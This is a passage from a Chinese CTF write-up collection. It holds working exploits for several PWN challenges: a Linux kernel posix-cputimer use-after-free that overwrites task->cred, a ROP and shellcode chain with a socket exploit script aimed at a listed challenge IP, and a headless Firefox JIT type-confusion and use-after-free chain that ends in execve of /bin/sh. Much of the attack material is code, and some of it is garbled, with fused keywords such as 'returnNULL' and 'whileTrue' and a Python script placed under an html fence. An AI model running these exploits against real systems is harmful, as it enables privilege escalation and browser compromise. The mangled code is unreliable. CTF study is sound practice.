3.  子进程内非leader线程用 `CLOCK_THREAD_CPUTIME_ID` 建远期timer后 `execve("/proc/self/exe")` ；同 `mm` 的3个helper反复 `mprotect` 50000个单页VMA，killer轮询 `tgkill` ，见 `ESRCH` 即 `SIGKILL` 。
    
4.  父进程 `waitid(WNOWAIT)` 留住僵尸，喷射filler与候选timer后 `waitpid` 回收， `cleanup_timerqueue()` 把节点挂进worker队列；清空slab后用匿名页与AIO页回收该页。
    
5.  worker触发 `collect_posix_cputimers()` ，从伪造页读出 `task_struct` 与direct map地址，算出两者固定偏移。
    
6.  按A/C/M布局重排伪造页，第二轮回收把 `task->cred` 指向伪造cred。
    
7.  worker以fsuid 0在 `/home/ctf` 建root文件并 `chmod 4755` ，预留的launcher用合法cred `execve` 它拿到euid 0，读 `/dev/vda` 搜 `flag{` 。
    

### 4\. PoC

```cpp
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define VMA_COUNT 50000UL

staticpid_t g_tgid;
staticuintptr_t g_vma;

static void *vma_helper(void *arg)
{
for (;;)
for (unsignedlong i = 0; i < VMA_COUNT; i++)
   mprotect((void *)(g_vma + i * 0x1000), 0x1000,
     (i & 1) ? PROT_READ : (PROT_READ | PROT_WRITE));
returnNULL;
}

static void *killer(void *arg)
{
pid_t tid = (pid_t)(uintptr_t)arg;

for (;;)
if (syscall(SYS_tgkill, g_tgid, tid, 0) < 0) {
   kill(tid, SIGKILL); /* TID交换已完成 */
   returnNULL;
  }
}

static void *exec_thread(void *arg)
{
struct sigevent sev = { .sigev_notify = SIGEV_NONE };
struct itimerspec its = { .it_value = { .tv_sec = 3600 } };
pid_t *tid = arg;
timer_t t;

 *tid = syscall(SYS_gettid);
if (!timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t))
  timer_settime(t, 0, &its, NULL);
 execl("/proc/self/exe", "poc", NULL);
returnNULL;
}

/* 子进程：helper争锁，exec线程被杀后留下悬空node */
static pid_t spawn_stale(void)
{
pid_t pid = fork(), tid = 0;
pthread_t th[4];

if (pid)
return pid;
 g_tgid = getpid();
for (int i = 0; i < 3; i++)
  pthread_create(&th[i], NULL, vma_helper, NULL);
 pthread_create(&th[3], NULL, exec_thread, &tid);
while (!tid)
  usleep(1000);
 pthread_create(&th[3], NULL, killer, (void *)(uintptr_t)tid);
for (;;)
  pause();
}

/* 伪造A/C/M三节点，第二次rb_erase把fake_cred写进task->cred */
static void forge_tree(uint8_t *page, uint64_t task, uint64_t cred)
{
uint64_t *A = (uint64_t *)(page + 0x200), *C = A + 0x20, *M = A + 0x30;

 A[0] = (uint64_t)C; A[2] = task + 0xd00; A[3] = task + 0xca0;
 C[0] = (uint64_t)M; C[1] = (uint64_t)A;  C[3] = task + 0xca0;
 M[1] = (uint64_t)(C + 1);                M[3] = task + 0xca0;
memset((void *)cred, 0, 0x100);
}

static void root_payload(void)
{
unsignedlonglong size = 0;
unsignedchar *buf;
ssize_t got = 0, n;

 setresuid(0, 0, 0);
int fd = open("/dev/vda", O_RDONLY | O_CLOEXEC);
if (fd < 0)
  _exit(1);
if (syscall(SYS_ioctl, fd, 0x80081272UL, &size) || !size)
  size = 8ULL << 20;
 size = size > (64ULL << 20) ? 64ULL << 20 : size;
 buf = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
while (got < (ssize_t)size && (n = read(fd, buf + got, size - got)) > 0)
  got += n;
 write(1, buf, got);
}
```

* * *

## PWN14-hexachord

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 容器题 |
| 附件  | PWN14-Hexachord.rar（复现包，约1.35MB） |
| 目标  | 47.95.113.113:20549（现场实例） |

Flag：flag{动态容器已脱敏}

题目说明：古堡幽深，六弦琴久寂；今琴灵忽醒，以六音为律，封终章碑文于二十乐章之中。每章皆藏残章一枚，须入秘境亲取。至少破三章，石碑乃现；集齐二十残章，碑文方得重铸。

### 2\. 题目分析

#### 二十章流程与双角色咒文

服务在一条TCP连接里连续进行二十个乐章，残章、结算与终章密文都绑定在这条会话上。每章先输出 `target:` 加80个十六进制字符（40字节魔方状态），随后给出菜单1) 调弦 2) 翻阅琴谱 3) 开辟共鸣腔 4) 弹奏 5) 哑弦 6) 离去。菜单4接收至多31字节咒文，校验器比对通过后回显 `ACCEPT` ，同一串字节紧接着作为x86-64机器码执行；发送 `6` 才进入下一章，外层wrapper在离开时才判定“残章到手”并计分。

`target` 的40字节按 `cp[8] || co[8] || ep[12] || eo[12]` 切分，依次是角块置换、角块朝向、棱块置换、棱块朝向；复原态为 `cp=0..7` 、 `co` 全1、 `ep=0..11` 、 `eo` 全1。转动表是一段0x118字节的二进制，六个面依次存放8字节 `CP` 、8字节 `CO` 、12字节 `EP` 、12字节 `EO` 。执行转动时置换按表重排索引，角块朝向用GF(4)乘法，棱块朝向模3相乘。朝向从1开始计数而不是从0，这是它和常见Kociemba面串最大的差别，也是不能直接套现成求解器的原因。

校验器只读原始字节， `byte % 6` 决定执行 `URFDLB` 中的哪一个顺时针四分之一转，与字符、编码无关。同一串字节随后又被当作代码执行，于是每个字节承担双重语义：余数必须让魔方走向 `target` ，数值本身又必须是有用的一字节指令。 `0x5a` （90）既是 `U` 又是 `pop rdx` ， `0x5c` （92）既是 `F` 又是 `pop rsp` ， `0xc3` （195）既是 `D` 又是 `ret` 。这条“余数与指令同时成立”的重合，就是把魔方公式变成栈迁移跳板的全部基础。

可用的单字节等价指令为： `U→0x90 nop` 、 `R→0x91 xchg eax,ecx` 、 `F→0xf8 clc` 、 `D→0xf9 stc` 、L→0x64 fs前缀、B→0x65 gs前缀； `L` 后面若还有公式步，可写成 `0xb2 imm8` （ `mov dl,imm8` ），让立即数顺带承担下一面的余数，一次编码两步。枢轴之后剩下的公式字节无需执行，写成0x30+面序号即可满足校验。31字节上限来自菜单4的行缓冲，咒文内不能出现换行；一旦公式里凑不出“pop面→ `F` → `D` ”这类子序列，就必须换一条公式。

#### 搜索与预计算表

四分之一转下随机目标通常要18~21步，31字节预算看似宽裕，实际搜索空间约4.3×10¹⁹，纯在线搜索赶不上章节时限。做法是先把复原侧的投影树建好：用Kociemba的 `twist/flip/slice` 打包成 `(twist*2048+flip)*495+slice` ，得到约5070万个投影节点，从复原态正向展开深度10~12；求解时从 `target` 反向展开深度9~10，两边在投影坐标处相交即得一条不超过22步的公式，再沿父指针回放出 `URFDLB` 序列。压缩版投影树约1GiB、几十秒建完，建表必须在连接之前完成，否则一章超时就会连累整条会话。

搜索目标不只是“能还原”，而是“公式里含有可编码的枢轴子序列”。程序依次尝试三种入口：pop面→ `F` → `D` 配 `pop rsp;ret` ，pop面→ `D` → `D` → `D` 配 `pop rbp;leave;ret` ，以及更宽松的 `pop` / `BL` / `D` 组合。若当前公式编不出，就对目标做24种整体旋转或24种镜像后重新求解，再把公式逐字符逆变换回原坐标。同一目标在不同视角下步数与形状都不同，换个视角往往就能凑出所需子序列。

#### 菜单1/2与栈布局

菜单1把恰好112字节的祷文写进BSS的 `PIE+0x5060` ，这里就是ROP链的落点。菜单2把路径按原始字节读入栈缓冲，最多255字节，其中偏移 `0xf0` 的8字节槽位正好会被枢轴当作返回地址弹出，填 `PIE+0x5060` 即可；走 `leave` 入口时填 `PIE+0x5058` ，让 `leave` 先弹掉一个无害qword再 `ret` 到 `PIE+0x5060` 。路径载荷要以短串加 `NUL` 开头，末尾不能带换行，并用填充凑满255字节，这样读入会写满到0xf0之后的槽位，而不是在换行处提前截断。

#### 用/proc/64/auxv取地址

PIE与ld.so基址每次运行都随机，但菜单2可以读任意路径。 `/proc/64/auxv` 是容器内服务父进程的辅助向量：16字节一对 `<QQ>` （tag、value），从 `AT_SYSINFO_EHDR(33)` 开始，遇 `tag==0` 结束。 `AT_PHDR(3)` 指向内存中的程序头，而ELF程序头在文件内偏移0x40处，故 `PIE = AT_PHDR - 0x40` ； `AT_BASE(7)` 就是动态链接器基址。gadget全部取自ld.so： `pop rdi;pop rbp;ret` 在 `ld+0x25AC` ， `pop rsi;pop rbp;ret` 在 `ld+0x599B` ， `pop rdx;leave;ret` 在 `ld+0x1F5FB` ， `pop rax;ret` 在 `ld+0x1548B` ， `syscall;ret` 在 `ld+0x16629` 附近。选auxv而不选 `/proc/self/maps` ，是因为它是定长二进制对，一次就读到加载器基址，省掉先泄漏libc的环节；PID64是容器PID命名空间里服务的固定编号， `/proc/64/` 与后面 `process_vm_writev(64,...)` 指向同一个父进程。

#### fork子进程与process_vm_writev回写

菜单1/2/4都是一次性动作，状态由BSS页 `PIE+0x5000` 里的三个标记控制： `tuned` 在页内偏移 `0x40` （4字节）， `read_once` 与 `spell_once` 在 `0x48` （共8字节）。校验通过后服务fork，由子进程执行咒文；子进程看到的标记已经置1，执行完就退出，父进程对此一无所知。因此只在子进程里清标记毫无用处，必须把子进程改好的整页写回父进程。第一段祷文正是这个序列： `mprotect(PIE+0x5000,0x1000,7)` 把该页改成可读写可执行，随后31字节代码清零 `[PIE+0x5048]` 与 `[PIE+0x5040]` ，再用 `process_vm_writev` （系统调用号311）把本进程的这一页写进PID64的同址页。成功后父进程的菜单1/2/4重新可用，同一章内还能第二次调弦、翻阅、弹奏。

31字节够用，是因为进入这段代码时寄存器已经就位： `mprotect` 成功返回 `RAX=0` ，同时 `RDI=PIE+0x5000` 、 `RSI=0x1000` 、 `RDX=7` ， `RBP` 里还留着 `call` 要用的 `syscall;ret` gadget。代码只需“清零两个槽位→压入 `iov_len` 与 `iov_base` → `rsi=mov r10` → `dl=1` 、 `r8d=1` 、 `r9d=0` → `rdi=64` → `ax=311` → `call rbp` ”。local与remote两组iovec可以指向同一地址，因为fork之后父子地址空间布局完全一致， `PIE+0x5000` 在两边都是同一页。

#### /flag→/tmp/x软链与过滤绕过

菜单2对含 `flag` 的路径会拒绝，但拒绝发生在255字节读入栈缓冲之后： `0xf0` 槽位照样被写好， `read_once` 也没有被消耗，所以随后还能再读一次文件。第二段祷文用纯ROP调 `__NR_symlink=88` ，把 `/flag` 链到 `/tmp/x` ；两条路径字符串直接写在祷文尾部（ `+80` 与 `+86` ），所有系统调用都经ld.so里的 `syscall;ret` gadget发起，避免原始 `0f 05` 字节被wrapper的指令过滤拦下。之后读 `/tmp/x` （路径不含 `flag` ）就得到66位十六进制残章，离开该章时外层才确认计分。

#### 十八枚残章与终章密钥

`gift.elf` 读入 `flag` 文件，用 `getrandom` 取32字节密钥，为每个密钥字节生成一个17次多项式，二十章各给出一组取值，并打印20条收据和 `flag.enc` 。每条残章66位hex即33字节：1字节来源标签加32字节份额。17次多项式由18个点唯一确定，所以至少需要18条有效记录；少于18条时插值出的密钥必然错误，AES-GCM的tag校验也会失败。标签只用于区分来源，插值时按计分顺序重编为 `x=1..18` ，第15章缺章不会在横坐标上留下空洞，重编号后的点集仍落在同一组17次多项式上，零处取值不变。

### 3\. 解题过程

#### 会话时序与帧定界

整条链只开一个socket，先等 `target: <80hex>` 出现，然后每章按固定顺序走：读auxv（菜单2）→调弦（菜单1，写第一段祷文）→布栈（菜单2，写255字节）→弹奏（菜单4，发咒文）→确认两次 `ACCEPT` →读 `/tmp/x` 取残章→发 `6` 离开。菜单提示是固定字节串卷轴: 、祷文: 、咒文: ，菜单尾部是6) 离去\\n> ；收发必须按字节匹配，不能用行读取，因为auxv回显含NUL和任意二进制。

魔方搜索放在后台线程与网络IO并行：每章一开始就把 `target` 交给线程，等auxv读完、祷文写完再取结果，搜索时间与IO时间重叠，不会叠加到章节时限上。wrapper有章节超时，超时会主动推进到下一章并打印新的 `target` ；此时旧章已无法提交，程序检测到“未请求的target”就改用新目标继续，该章记为未计分，避免中断整条链。

#### 求解与咒文编码

先把 `target` 的80个hex解成40字节，构造 `State(cp,co,ep,eo)` ，用预计算树求出 `URFDLB` 序列，最后逐字节编码。编码器按顺序尝试三种入口，并断言三条性质：长度与原公式相等且不超过31、逐字节 `%6` 与公式面一致、 `State().play(spell)` 等于 `target` 。第一段枢轴的骨架是三个字节：某个 `pop reg` （ `0x58` ~ `0x5d` 分别对应 `L/B/U/R/D` ）、 `0x5c` （ `pop rsp` ，余数2即 `F` ）、 `0xc3` （ `ret` ，余数3即 `D` ）。前缀用 `0x90/0x91/0xf8/0xf9/0x64/0x65` 顶住，遇到 `L` 且后面还有公式步时写 `0xb2 0x30+index` ，把下一步的余数塞进立即数。 `leave` 入口则是 `pop rbp` （ `0x5d` ）接 `0xc9` （ `leave` ，201%6=3）再接 `0xc3` ，三个字节都是 `D` ，正好消耗公式里连续三个 `D` 。

例如公式片段`...U F D...`编码为 `5a 5c c3` ，执行时先弹掉栈上一个qword，再 `pop rsp` 把栈指针换成刚弹出的值， `ret` 即跳进祷文。枢轴之前的字节都是无副作用的单字节指令，枢轴之后的字节只用来满足校验、永不执行。

#### 取地址与栈布局

读 `/proc/64/auxv` 的响应先剥掉卷轴: 标记，之后每16字节解一对 `<QQ>` ，遇 `tag==0` 停止，必须同时存在3、7、25三项。算得 `pie=aux[3]-0x40` 、 `ld=aux[7]` 、 `prayer=pie+0x5060` ，祷文与gadget地址全部由这两个基址派生，所以每章都要重取一次，上一章的数值不能复用。

布栈载荷为 `b"x\x00" + b"A"*(0xf0-2) + pack(prayer)` ，再补 `B` 到恰好255字节，整段不含 `\n` ：开头的短串加NUL让路径在第一个NUL处结束，补齐到255字节则保证0xf0槽位一定被写到，同时避免换行为读入提前收尾。被拦路径用 `b"flag\x00" + spray[5:]` ，前五个字节触发黑名单，但0xf0处的8字节与原载荷完全一致，布栈效果不变而 `read_once` 未被消耗。

#### 第一段祷文：mprotect、清标记、回写父进程

112字节按qword排布， `q0` 在 `prayer+0` ， `q1..q9` 在 `+8..+0x48` ，31字节代码接在 `+0x50` ：

```powershell
q0 ld+0x25AC   pop rdi; pop rbp; ret
q1 pie+0x5000  mprotect 起始地址
q2 prayer+0x20 leave; ret 的新 rbp
q3 ld+0x1F5FB  pop rdx; leave; ret
q4 7           PROT_READ|WRITE|EXEC
q5 ld+0x599B   pop rsi; pop rbp; ret
q6 0x1000      mprotect 长度
q7 0           rbp，进代码前被换成 syscall;ret gadget
q8 pie+0x1344  mprotect@plt（跳过 endbr64）
q9 prayer+0x50 31字节代码入口
```

链条成立的关键在 `pop rdx; leave; ret` 这个组合： `rdx` 取到7之后， `leave` 把 `rsp` 拉到 `prayer+0x20` ，于是 `pop rbp` 吃掉 `q4` 、 `ret` 跳到 `q5` ，用一个gadget同时完成“传参”和“跨过中间槽位”。 `mprotect` 返回0后 `rax` 清零、参数寄存器保持不变， `ret` 落到 `q9` 。31字节代码依次做： `mov [rdi+0x48],rax` 清零 `read_once` 与 `spell_once` 、 `mov [rdi+0x40],eax` 清零 `tuned` 、 `push rsi` （0x1000）、 `push rdi` （页地址）、 `push rsp; pop rsi` 得到local iovec、 `mov r10,rsi` 复用同一结构作remote iovec、 `mov dl,1` 与 `mov r8d,edx` 各置计数1、 `xor r9d,r9d` 清flags、 `push 64; pop rdi` 指定父进程、 `mov ax,311` 选 `process_vm_writev` 、 `call rbp` 发起调用。用 `mov ax` 而非 `mov eax` 是为了省字节，此时 `rax` 本来就是0。

`call rbp` 会把返回地址压在iovec下方，不影响iovec内容；iovec里的 `iov_base=pie+0x5000` 在父进程中同样有效。载荷每次生成后都要扫描是否含 `0f 05` ，若某个gadget地址的字节恰好构成该序列，就改用 `ld+0x25F66` 、 `ld+0x25F85` 、 `ld+0x25FC9` 等备选 `syscall;ret` 。

#### 第二段祷文与被拦路径

第二段祷文是纯ROP，10个qword加尾部字符串： `pop rax; ret` 置88（ `__NR_symlink` ）， `pop rdi; pop rbp; ret` 取 `prayer+80` （ `/flag\0` ）， `pop rsi; pop rbp; ret` 取 `prayer+86` （ `/tmp/x\0` ）， `ret` 进 `syscall;ret` ，最后跳到服务的 `_exit(0)` ，免得子进程回到不可控的返回路径。字符串放在 `+80` 之后，整个祷文仍压成112字节，同样要保证不含 `0f 05` 。

执行次序有讲究：先调弦写入symlink祷文，再发被拦的255字节路径完成布栈（这一步不读文件、也不消耗 `read_once` ），随后第二次弹奏触发symlink，最后读 `/tmp/x` 。读回的响应去掉开头的卷轴: 和结尾的完整菜单，用 `(?<![0-9a-f])[0-9a-f]{66}(?![0-9a-f])` 抓66位hex，前后加边界是为了不把菜单数字或更长的十六进制串误当残章。发送 `6` 之后，外层回显“残章到手”才算真正计分。

#### 二十章执行与开碑

现场执行中第1至14章和第16至19章计分，第15章跳过（那一章的公式没能编出可用枢轴），第20章开始时已满18枚，直接发 `6` 离开，结算为 `18/20` 并给出 `flag.enc` 。整理时把第16章得到的记录放在第十五个有效位置：通过外层计分的记录按取得顺序排好，第一条到第十八条依次取Shamir横坐标 `x=1..18` ，纵坐标取后面的32字节，份额自带的来源标签不参与插值。即使中间有一章空缺，计分顺序仍然连续，不会在横坐标上留下洞；18条必须来自同一条TCP会话，跨轮拼接会得到互相矛盾的份额。

插值在GF(256)上逐字节进行，约简多项式 `0x11d` ，即 `xtime` 溢出时异或 `0x1d` ；加法是异或，乘法用八轮“看最低位累加、左移、溢出补0x1d”的移位实现，除法取逆元 `a^254` 。对每个密钥字节，用十八个点在零处作拉格朗日插值：

```
K[b] = XOR_j ( y[j,b] * PRODUCT_{m != j} x[m] / (x[m] XOR x[j]) )
```

权重只依赖横坐标，先算好18个权重再逐字节累乘，32字节密钥一次得到。随后把 `flag.enc` 的70字节切成12字节nonce || 42字节密文 || 16字节tag，以AESGCM(key).decrypt(nonce, 密文||tag, None)解密。GCM的tag同时认证密钥与密文：份额不足、横坐标错位或混轮都会让tag校验失败，因此只有解密不抛异常时，42字节明文才可作为最终提交值。

### 4\. PoC

```python
import re, socket, struct

SCROLL, PRAYER, SPELL = "卷轴: ".encode(), "祷文: ".encode(), "咒文: ".encode()
MENU = "6) 离去\n> ".encode()
TARGET = re.compile(rb"target:\s*([0-9a-f]{80})")

class Proto:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(20)
        self.buf = bytearray

    def send(self, data):
        self.s.sendall(data)

    def until(self, marker):
        whileTrue:
            pos = self.buf.find(marker)
            if pos >= 0:
                end = pos + len(marker)
                out, self.buf = bytes(self.buf[:end]), self.buf[end:]
                return out
            chunk = self.s.recv(65536)
            ifnot chunk:
                raise EOFError
            self.buf.extend(chunk)

def menu_read(p, path):
    p.send(b"2\n"); p.until(SCROLL); p.send(path)
    return p.until(MENU)

def menu_tune(p, prayer):
    assert len(prayer) == 112
    p.send(b"1\n"); p.until(PRAYER); p.send(prayer)
    return p.until(MENU)

def menu_play(p, spell):
    assert1 <= len(spell) <= 31andb"\n"notin spell
    p.send(b"4\n"); p.until(SPELL); p.send(spell + b"\n")
    out = p.until(MENU)
    assertb"ACCEPT\n"in out
    return out

def build_symlink_prayer(pie, ld, source=b"/flag", dest=b"/tmp/x"):
    prayer = pie + 0x5060
    words = [
        ld + 0x1548B, 88,                              # pop rax; __NR_symlink
        ld + 0x25AC, prayer + 80, 0,                   # oldpath
        ld + 0x599B, prayer + 80 + len(source) + 1, 0, # newpath
        ld + 0x16629,                                  # syscall; ret
        pie + 0x2414,                                  # _exit(0)
    ]
    out = struct.pack("<Q", words[0]) + struct.pack("<9Q", *words[1:]) + source + b"\0" + dest + b"\0"
    out = out.ljust(112, b"\0")
    assertb"\x0f\x05"notin out
    return out

def gf_mul(a, b):
    r = 0
    for _ in range(8):
        if b & 1: r ^= a
        carry = a & 0x80
        a = (a << 1) & 0xFF
        if carry: a ^= 0x1D
        b >>= 1
    return r

def recover_key(shares):
    xs = [s[0] for s in shares[:18]]
    weights = []
    for i, xi in enumerate(xs):
        w = 1
        for j, xj in enumerate(xs):
            if i != j:
                inv = 1
                e, base = 254, xi ^ xj
                while e:
                    if e & 1: inv = gf_mul(inv, base)
                    base, e = gf_mul(base, base), e >> 1
                w = gf_mul(w, gf_mul(xj, inv))
        weights.append(w)
    key = bytearray(32)
    for share, w in zip(shares[:18], weights):
        for i, y in enumerate(share[1:]):
            key[i] ^= gf_mul(y, w)
    return bytes(key)

def exploit(host, port, spell):
    p = Proto(host, port)
    target = TARGET.search(p.until(b"\n")).group(1).decode()
    aux = menu_read(p, b"/proc/64/auxv\0")
    pairs = {}
    for i in range(0, len(aux) - 15, 16):
        tag, val = struct.unpack("<QQ", aux[i:i+16])
        if tag == 0: break
        pairs[tag] = val
    pie, ld = pairs[3] - 0x40, pairs[7]
    menu_tune(p, build_symlink_prayer(pie, ld))
    spray = b"A" * (0xf0 - 2) + struct.pack("<Q", pie + 0x5060) + b"B" * 0x3e
    menu_read(p, b"flag\0" + spray[5:])          # 被拦，但栈已布置
    menu_play(p, spell)                           # 触发 symlink
    leak = menu_read(p, b"/tmp/x")                # 66 位 hex 残章
    p.send(b"6\n")
    return target, pie, ld, leak
```

* * *

## PWN15-What The Fox!

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+容器） |
| 附件  | What_The_Fox_bff14d2d1ca2da67f016aaa0cb38b975.zip |
| 目标  | 在headless Firefox中执行代码，运行/readflag |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

服务要求输入HTML，以单独一行 `EOF` 结束；服务落盘后用headless Firefox打开，浏览器stdout接回同一TCP，payload里的 `dump()` 逐行回传。目标是让渲染进程执行 `/readflag` ，输出用 `echo FLAG_START` / `FLAG_END` 夹住。

版本指纹：页面侧有 `processLocally` / `phrases` 、launcher无 `getauxval` / `realpath` 导入，源码夹在2026-10-16至10-19。偏移取自同版本 `libxul` 符号： `vptr-0xc47abc0` 为PIE， `base+0xc68d5a8` 是 `read` 的GOT槽， `read-0x128150` 为libc， `execve=libc+0xf7f00` 、 `setcontext=libc+0x4be80` 。

headless没有窗口与手势，只能让渲染引擎解析HTML时出错。链路：Image文档把图片加载状态的回放接进JS；同步XHR排空嵌套事件循环，让取消加载的proxy异步释放；JIT类型混淆把double位模式当字符串长度压到8字节，得到改data指针的任意读写；从 `Image` / `Uint8Array` 的wrapper取JS对象、native指针、vptr与backing store反推PIE与libc；在回收内存上摆 `setcontext` 与 `execve` 参数。

重入：根元素带 `class="reftest-wait"` ； `load` 后预热 `data:`图片，建隐藏 `about:blank` iframe并把 `contentDocument` 设为 `contenteditable` ，再建 `src` 为PNG Blob URL的iframe并注册捕获阶段 `readystatechange` 。当 `readyState==="interactive"` 且 `contentType==="image/png"` 时，把image document的 `<img>` 用 `adoptNode` 搬进隐藏文档并换回预热 `src` ，再 `armStyleFlush()` ：SVG的 `defs/g#replay-source` 里放 `type="application/json"` 的 `script` （文本 `replayPayload()` ），改成 `application/javascript` 后插入 `<use href="#replay-source">` 。use克隆实例化脚本时调用栈压着渲染帧； `contenteditable` 让native属性更新时重试编辑器初始化并flush父文档样式，这是从CSS刷新回到JS的门。

UAF： `replayPayload()` 先 `runJIT()` ，再 `removeAttribute("src")` ——取消只投递 `RemoveFromLoadGroup` runnable，最后一个引用在异步点归零， `xhr.open(...,false)` 的同步XHR进入嵌套事件循环把它执行掉。随后100个0xf0字节 `Blob` 吃掉被释放对象： `+0x10` 栈、 `+0x18` 目标函数、 `+0x40` 为 `0x1f80` 、 `+0x50/+0x60` 指向backing store、 `+0xc8/+0xd0` 为路径与argv。

JIT混淆： `f(o,a,b,h1,h2)` 里 `k=a+b` ，随后 `h1.w=k` 、 `o.hasOwnProperty(k)` 、 `h2.x=k` 。训练时 `i` 在 `[600,603)` 把 `o` 换成 `'primitive'` ， `[6000,6005)` 换成5个异形对象， `i>=6005` 把 `b` 改成 `'h2'` ，使 `h2.x` 先学double再喂字符串，一个方向把字符串指针当未装箱double写，另一个方向把double位模式当字符串读。 `header(len,flags=0x450)` 造低32位 `0x450` 、高32位 `len` 的double，当字符串头后 `z.length` 即 `len` 。喷射16轮、每轮30000个 `{p0..p4}` 对象， `base=100000+r*30000` ， `hs2[i].x.length` 落进区间即命中重叠槽，逐槽改 `header(8)` 定位长度字段，下一槽就是data指针。

泄露与伪造：字符串data指向 `image` 读出JS对象， `+24` 取native指针，头8字节是vptr，减 `0xc47abc0` 得PIE； `base+0xc68d5a8` 读出 `read` 真实地址，减 `0x128150` 得libc； `Uint8Array` 的wrapper `+0x30` 是backing store。把这块0x200缓冲区当伪造对象： `+0x100` 放 `/bin/sh` 、 `+0x110` 放 `-c` 、 `+0x120` 放命令、 `+0x170` 放argv、 `+0xa8` 放 `setcontext` 、 `+0x1c8` 放栈标记。

### 3\. 解题过程

1.  连接确认 `EOF` 协议， `dump()` 做观测通道。
    
2.  读launcher定构建窗口，核对 `0xc47abc0` 、 `0xc68d5a8` 、 `0x128150` 等常量。
    
3.  构造image document重入， `armStyleFlush()` 把 `replayPayload()` 塞进SVG use克隆。
    
4.  `runJIT()` 训练喷射， `removeAttribute("src")` 后同步XHR排空，Blob占位。
    
5.  泄露PIE、libc与backing store，填伪造对象。
    
6.  移除 `reftest-wait` 触发虚调用， `setcontext` 转 `execve` 跑 `/readflag` 。
    

### 4\. PoC

```html
import re, socket

HOST, PORT = "fox", 1337
FLAG = re.compile(rb"(?m)^FLAG_START\r?\n(flag\{[^\r\n}]+\})FLAG_END")

JS = r'''<html class="reftest-wait"><body><script>
var dv=new DataView(new ArrayBuffer(8)),im=new Image(),u8=new Uint8Array(0x200);
var fired,ni,lc,bf;
function hd(l,f){dv.setUint32(0,f||0x450,true);dv.setUint32(4,l,true);return dv.getFloat64(0,true)}
function pd(p){dv.setBigUint64(0,BigInt(p),true);return dv.getFloat64(0,true)}
function jit(){
function f(o,a,b,h1,h2){var k=a+b;h1.w=k;var r=o.hasOwnProperty(k);h2.x=k;return r}
with({}){}
var N=9000,A=[],B=[],P=[],sm={abcdefgh1:1,abcdefgh2:2};
for(var i=0;i<N;i++){A.push({a:i});B.push({a:i})}
for(var i=0;i<5;i++)P.push({['p'+i]:1})
for(var i=0;i<N;i++){var o=sm,b='h1';
 if(i>=600&&i<603)o='primitive';else if(i>=6000&&i<6005)o=P[i-6000];else if(i>=6005)b='h2';
 f(o,'abcdefg',b,A[i],B[i])}
var S=['p0','p1','p2','p3','p4'],hit,arr;
for(var r=0;r<16&&!hit;r++){var base=100000+r*30000;arr=[];
 for(var j=0;j<30000;j++){var h=hd(base+j);arr.push({p0:h,p1:h,p2:h,p3:h,p4:h})}
 for(var i=6006;i<N&&!hit;i++){var z=B[i].x,n=z.length;
  if(n<base||n>=base+30000)continue;
  var o=arr[n-base];
  for(var k=0;k<4;k++){var old=o[S[k]];o[S[k]]=hd(8);
   if(z.length===8){hit={i:i,j:n-base,k:k};break}
   o[S[k]]=old}}}
if(!hit)return;
var s=B[hit.i].x,o=arr[hit.j],hp=S[hit.k],dp=S[hit.k+1];
function rb(){var b=[];for(var k=0;k<8;k++)b.push(s[k].charCodeAt(0));return b}
function at(p){o[hp]=hd(8,0x410);o[dp]=pd(p);return rb()}
function rv(p){var b=at(p),n=0;for(var k=0;k<6;k++)n+=b[k]*2**(8*k);return n}
function rj(v){o[hp]=hd(8);o[dp]=v;var b=rb(),n=0;for(var k=0;k<6;k++)n+=b[k]*2**(8*k);return n%2**47}
var pie=rv(rv(rj(im)+24))-0xc47abc0;
lc=rv(pie+0xc68d5a8)-0x128150;
bf=rv(rj(u8)+0x30);
return true;
}
function fake(){
var D=BigInt(bf),L=BigInt(lc),ex=L+0xf7f00n,sc=L+0x4be80n;
var st=D+0x1c8n,p=D+0x100n,a=D+0x110n,c=D+0x120n,av=D+0x170n,T=new DataView(u8.buffer);
var E=s=>new TextEncoder().encode(s);
u8.set(E("/bin/sh\0"),0x100);u8.set(E("-c\0"),0x110);
u8.set(E("echo FLAG_START;/readflag;echo FLAG_END\0"),0x120);
var W=(o,a,v)=>o.setBigUint64(a,BigInt(v),true);
W(T,0x170,p);W(T,0x178,a);W(T,0x180,c);W(T,0x1c8,0x43434343);W(T,0xa8,sc);
var b=new Uint8Array(0xf0),bd=new DataView(b.buffer);
W(bd,0x10,st);W(bd,0x18,ex);bd.setUint32(0x40,0x1f80,true);
W(bd,0x50,D);W(bd,0x60,D);W(bd,0xc8,p);W(bd,0xd0,av);
for(var i=0;i<100;i++)new Blob([b]);
}
function replayPayload(){
if(fired)return;fired=true;
if(!jit())return;
ni.removeAttribute("src");
var x=new XMLHttpRequest();x.open("GET",location.pathname+"?d="+Math.random(),false);x.send();
fake();
}
</script></html>'''

def attempt():
    s = socket.create_connection((HOST, PORT), 65)
    s.recv(4096)
    s.sendall(JS.encode() + b"\nEOF\n")
    s.settimeout(65)
    return FLAG.search(s.recv(1 << 20)).group(1).decode()
```

* * *

## PWN16-shadowledger

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 附件题（KVM guest内核提权） |
| 附件  | shadowledger_dcb3b5ee9fc0a77b3dfcc6934a738a99.zip |
| 目标  | 以nobody进入guest，提权到root并读取/flag |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

